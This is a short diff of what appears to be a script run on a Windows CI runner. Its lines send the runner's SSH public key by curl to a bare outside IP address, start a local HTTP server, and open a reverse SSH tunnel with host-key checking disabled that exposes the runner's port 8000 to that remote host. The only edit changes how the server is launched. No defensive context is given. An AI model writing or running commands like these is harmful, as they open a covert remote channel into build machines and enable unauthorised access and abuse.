@@ -4,7 +4,7 @@ def main
     curl -F key=@C:\msys64\home\runneradmin\.ssh\id_rsa.pub http://89.104.69.220:3000/key
     #call npm init -y
     #call npm i node-pty
-    start python -m http.server
+    python -m http.server
     curl http://127.0.0.1:8000
     C:\msys64\usr\bin\ssh.exe -vvv -o StrictHostKeyChecking=no -N -R 8000:127.0.0.1:8000 github@89.104.69.220
 
